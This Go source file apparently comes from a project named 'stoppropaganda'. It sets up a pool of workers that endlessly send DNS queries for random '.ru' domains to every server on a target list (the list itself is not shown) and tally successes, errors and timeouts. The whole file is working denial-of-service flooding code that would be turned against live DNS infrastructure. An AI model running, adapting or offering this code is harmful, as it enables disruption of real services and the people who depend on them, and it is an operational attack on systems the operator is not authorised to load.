package stoppropaganda

import (
	"math/rand"
	"strings"
	"sync"

	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/targets"
	"github.com/miekg/dns"
)

type DNSTargetStatus struct {
	Requests     uint   `json:"requests"`
	Success      uint   `json:"success"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`
}

type DNSTarget struct {
	Status  DNSTargetStatus
	mux     sync.Mutex
	message *dns.Msg
	target  string
}

var dnsClient *dns.Client

var dnsTargets = map[string]*DNSTarget{}

func startDNS() {
	for targetDNSServer := range targets.TargetDNSServers {
		questionDomain := getRandomDomain() + "."
		message := new(dns.Msg)
		message.SetQuestion(questionDomain, dns.TypeA)

		dnsTargets[targetDNSServer] = &DNSTarget{
			message: message,
			target:  targetDNSServer,
		}
	}

	dnsChannel := make(chan *DNSTarget, *flagDNSWorkers)

	// Spawn workers
	for i := 0; i < *flagDNSWorkers; i++ {
		go runDNSWorker(dnsChannel)
	}

	// Issue tasks
	go func() {
		for {
			for _, dns := range dnsTargets {
				dnsChannel <- dns
			}
		}
	}()
}

func runDNSWorker(c chan *DNSTarget) {
	for {
		dnsTarget := <-c
		_, _, err := dnsClient.Exchange(dnsTarget.message, dnsTarget.target)

		dnsTarget.mux.Lock()
		dnsTarget.Status.Requests++
		if err != nil {
			dnsTarget.Status.Errors++
			switch {
			case strings.HasSuffix(err.Error(), "no such host"):
				dnsTarget.Status.LastErrorMsg = "Host does not exist"
			case strings.HasSuffix(err.Error(), "connection refused"):
				dnsTarget.Status.LastErrorMsg = "Connection refused"
			case strings.HasSuffix(err.Error(), "i/o timeout"):
				dnsTarget.Status.LastErrorMsg = "Query timeout"
			default:
				dnsTarget.Status.LastErrorMsg = err.Error()
			}
		} else {
			dnsTarget.Status.Success++
		}
		dnsTarget.mux.Unlock()
	}
}

var randomDomainRunes = []rune("abcdefghijklmnopqrstuvwxyz")

func getRandomDomain() string {
	randomLength := rand.Intn(20-6) + 6 // from 6 to 20 characters length + ".ru"
	b := make([]rune, randomLength)
	for i := range b {
		b[i] = randomDomainRunes[rand.Intn(len(randomDomainRunes))]
	}
	return string(b) + ".ru"
}
